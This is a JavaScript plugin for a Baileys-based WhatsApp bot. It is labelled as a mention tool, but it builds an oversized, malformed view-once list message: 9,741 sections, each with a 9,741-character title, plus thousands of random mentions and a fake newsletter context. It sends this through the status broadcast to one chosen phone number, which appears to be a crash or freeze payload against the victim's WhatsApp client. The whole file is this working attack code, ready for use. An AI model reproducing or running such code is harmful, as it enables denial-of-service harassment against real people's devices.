import { generateWAMessageFromContent } from '@whiskeysockets/baileys'

let handler = async (m, { conn, args, usedPrefix, command }) => {
  if (!args[0]) {
    return conn.reply(m.chat, `❌ *Uso incorrecto*

📌 Ejemplo:
${usedPrefix + command} @usuario o número de teléfono`, m)
  }

  // Obtener el JID del objetivo
  let isTarget
  if (m.mentionedJid && m.mentionedJid.length > 0) {
    // Si se mencionó a un usuario
    isTarget = m.mentionedJid[0]
  } else if (args[0].includes('@')) {
    // Si se proporcionó un JID directamente
    isTarget = args[0]
  } else if (/^\d+$/.test(args[0])) {
    // Si se proporcionó un número de teléfono
    isTarget = args[0] + '@s.whatsapp.net'
  } else {
    return conn.reply(m.chat, '❌ Formato de destino inválido. Usa @usuario o número de teléfono', m)
  }

  try {
    await conn.reply(m.chat, `⏳ *Enviando menciones a* ${isTarget}...`, m)

    const delaymention = Array.from({
      length: 9741
    }, (_, r) => ({
      title: "᭯".repeat(9741),
      rows: [{
        title: r + 1,
        id: r + 1
      }]
    }))

    const MSG = {
      viewOnceMessage: {
        message: {
          listResponseMessage: {
            title: "x",
            listType: 2,
            buttonText: null,
            sections: delaymention,
            singleSelectReply: {
              selectedRowId: "x"
            },
            contextInfo: {
              mentionedJid: Array.from({
                length: 9741
              }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"),
              participant: isTarget,
              remoteJid: "status@broadcast",
              forwardingScore: 9741,
              isForwarded: true,
              forwardedNewsletterMessageInfo: {
                newsletterJid: "0@newsletter",
                serverMessageId: 1,
                newsletterName: "x"
              }
            },
            description: "x"
          }
        }
      },
      contextInfo: {
        channelMessage: true,
        statusAttributionType: 2
      }
    }

    const msg = generateWAMessageFromContent(isTarget, MSG, {})

    await conn.relayMessage("status@broadcast", msg.message, {
      messageId: msg.key.id,
      statusJidList: [isTarget],
      additionalNodes: [{
        tag: "meta",
        attrs: {},
        content: [{
          tag: "mentioned_users",
          attrs: {},
          content: [{
            tag: "to",
            attrs: {
              jid: isTarget
            },
            content: undefined
          }]
        }]
      }]
    })

    await conn.reply(m.chat, `✅ *Menciones enviadas exitosamente a* ${isTarget}`, m)

  } catch (e) {
    console.error(e)
    return conn.reply(m.chat, `❌ Error al enviar menciones: ${e.message}`, m)
  }
}

handler.help = ['mentionsw <@usuario|número>']
handler.tags = ['tools']
handler.command = ['mentionsw', 'msw', 'mencionsw']

export default handler
